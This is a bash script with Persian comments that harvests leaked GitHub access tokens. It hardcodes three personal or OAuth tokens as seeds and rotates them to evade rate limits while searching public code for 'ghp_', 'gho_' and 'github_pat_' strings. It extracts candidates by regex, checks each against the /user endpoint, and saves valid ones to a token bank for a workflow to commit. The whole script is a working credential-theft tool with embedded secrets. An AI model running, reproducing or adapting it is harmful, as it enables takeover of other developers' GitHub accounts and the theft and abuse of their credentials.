#!/bin/bash
set -euo pipefail

# --- توکن‌های هاردکد اولیه (seed) ---
SEED_TOKENS=(
  "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"
  "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"
  "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"
)

TOKEN_FILE="tokens.txt"

# --- توابع ---

# خوندن توکن‌ها از فایل (اگر هست) و اضافه کردن seedها
load_tokens() {
  local tokens=()
  # اگر فایل موجود و غیرخالی بود، توکن‌هاش رو بخون
  if [ -f "$TOKEN_FILE" ] && [ -s "$TOKEN_FILE" ]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      tokens+=("$line")
    done < "$TOKEN_FILE"
  fi
  # اضافه کردن seedها برای اولین اجرا (بدون تکرار)
  for t in "${SEED_TOKENS[@]}"; do
    # فقط اگر هنوز توی آرایه نباشه
    if ! printf '%s\n' "${tokens[@]}" | grep -qxF "$t"; then
      tokens+=("$t")
    fi
  done
  # حذف تکرارها و برگردوندن
  printf '%s\n' "${tokens[@]}" | sort -u
}

# ذخیره توکن‌ها در فایل (پوشش کامل قبلی)
save_tokens() {
  printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
}

# انتخاب توکن با چرخش fair (استفاده از شمارنده ساده در runtime)
# برای سادگی از شمارنده چرخشی در متغیر محیطی استفاده می‌کنیم. چون ورکفلو می‌تونه استاتیک نباشه، بهتره توکن‌ها رو بر اساس یه شاخص تو فایل موقت ذخیره کنیم.
# ولی برای وضوح از یه عدد اتفاقی ساده استفاده می‌کنیم: next_token_index
NEXT_INDEX=0
TOKENS_ARRAY=()

rotate_token() {
  local len=${#TOKENS_ARRAY[@]}
  if [ $len -eq 0 ]; then
    echo "No tokens available!" >&2
    exit 1
  fi
  # گرفتن توکن فعلی
  local token="${TOKENS_ARRAY[$NEXT_INDEX]}"
  # افزایش شاخص با بازگشت به اول
  NEXT_INDEX=$(( (NEXT_INDEX + 1) % len ))
  echo "$token"
}

# Rate-limit آگاهانه: اگر rate limit باقی‌مونده کم بود، توکن بعدی رو انتخاب کنه
# ولی برای سادگی، بعد از هر درخواست delay مختصر می‌ذاریم (اگر rate limit تقریباً 0 باشه، می‌ایستیم)
check_rate_limit() {
  local token="$1"
  local resp
  resp=$(curl -sS -H "Authorization: token $token" "https://api.github.com/rate_limit" 2>/dev/null || true)
  if [ -z "$resp" ]; then return 1; fi
  local remaining=$(echo "$resp" | jq -r '.rate.remaining // .resources.core.remaining // 0')
  if [ "$remaining" -lt 1 ]; then
    return 1
  fi
  return 0
}

# --- شروع اسکریپت ---
echo "[*] Loading token bank..." >&2
mapfile -t TOKENS_ARRAY < <(load_tokens)
echo "Loaded ${#TOKENS_ARRAY[@]} unique tokens." >&2
# اگر خالی بود (بعد از حذف تکراری‌ها) خطا
if [ ${#TOKENS_ARRAY[@]} -eq 0 ]; then
  echo "ERROR: Token bank empty after dedup, even with seeds?" >&2
  exit 1
fi

# ذخیره اولیه تو فایل برای commit بعدی (اگر جدید اضافه شده باشه)
save_tokens "${TOKENS_ARRAY[@]}"

# ---- جستجوی کد با API گیتهاب (با توزیع بار بین توکن‌ها) ----
# الگوی جستجو: ghp_ OR gho_ (لیترال سرچ)
SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
MAX_PAGES=5          # تعداد صفحات در هر اجرا (کنترل حجم)
PER_PAGE=30          # هر صفحه 30 نتیجه
CANDIDATES_TMP=$(mktemp)

echo "[*] Starting code search..." >&2
# ما چند توکن داریم؛ برای هر صفحه یک توکن مختلف استفاده می‌کنیم با چرخش
for ((page=1; page<=MAX_PAGES; page++)); do
  token=$(rotate_token)
  # اگر rate limit توکن فعلی کمه، توکن بعدی رو امتحان کن (تا 3 بار تلاش)
  for attempt in 1 2 3; do
    if ! check_rate_limit "$token"; then
      echo "[!] Token $token rate limited, switching..." >&2
      token=$(rotate_token)
    else
      break
    fi
  done
  if ! check_rate_limit "$token"; then
    echo "[!] All tokens exhausted for this run." >&2
    break
  fi

  echo "[*] Page $page with token ${token:0:10}..." >&2
  response=$(curl -sS -H "Authorization: token $token" \
    -H "Accept: application/vnd.github.text-match+json" \
    "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page" 2>/dev/null || true)

  # استخراج text-matches (قطعه‌های حاوی تطابق)
  matches=$(echo "$response" | jq -r '
    .items[]?.text_matches[]?.fragment // empty
  ' 2>/dev/null || true)

  if [ -n "$matches" ]; then
    # با رجیکس توکن‌های معتبر گیتهاب رو از قطعه‌ها بیرون بکش
    # الگو: gh[po]_[A-Za-z0-9_]{36,} و github_pat_[A-Za-z0-9_]{22,}
    echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
  fi

  # تأخیر کوتاه بین صفحات (مودبانه)
  sleep 2
done

# حذف خطوط تکراری
if [ -s "$CANDIDATES_TMP" ]; then
  sort -u -o "$CANDIDATES_TMP" "$CANDIDATES_TMP"
  echo "[*] Found $(wc -l < "$CANDIDATES_TMP") unique candidate tokens." >&2
else
  echo "[*] No candidates found in this run." >&2
  # خروج بدون تغییر
  exit 0
fi

# ---- تست سلامت توکن‌های کاندید ----
echo "[*] Testing candidates for validity..." >&2
VALID_TMP=$(mktemp)
while IFS= read -r candidate; do
  # skip empty
  [ -z "$candidate" ] && continue
  # یک توکن از بانک برای تست استفاده نمی‌کنیم، چون candidate خودش باید احراز بشه
  # مستقیماً تستش می‌کنیم با curl به /user
  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: token $candidate" \
    "https://api.github.com/user" 2>/dev/null || echo "000")
  if [ "$http_code" = "200" ]; then
    echo "[+] VALID: $candidate" >&2
    echo "$candidate" >> "$VALID_TMP"
  else
    echo "[-] Invalid: $candidate (HTTP $http_code)" >&2
  fi
  sleep 1
done < "$CANDIDATES_TMP"

# تمیزکاری
rm -f "$CANDIDATES_TMP"

# اگر هیچ توکن معتبری پیدا نشد، خارج شو
if [ ! -s "$VALID_TMP" ]; then
  echo "[*] No valid new tokens." >&2
  rm -f "$VALID_TMP"
  exit 0
fi

# ---- ادغام با بانک موجود و ذخیره ----
# دوباره بانک فعلی رو لود کن
mapfile -t CURRENT_BANK < <(load_tokens)
# اضافه کردن توکن‌های جدید معتبر
for t in $(sort -u "$VALID_TMP"); do
  CURRENT_BANK+=("$t")
done
# ذخیره (بدون تکرار)
save_tokens "${CURRENT_BANK[@]}"
rm -f "$VALID_TMP"

echo "[*] Token bank updated. New size: $(wc -l < "$TOKEN_FILE")" >&2
# خروج موفق. ورکفلو کار commit رو انجام میده.
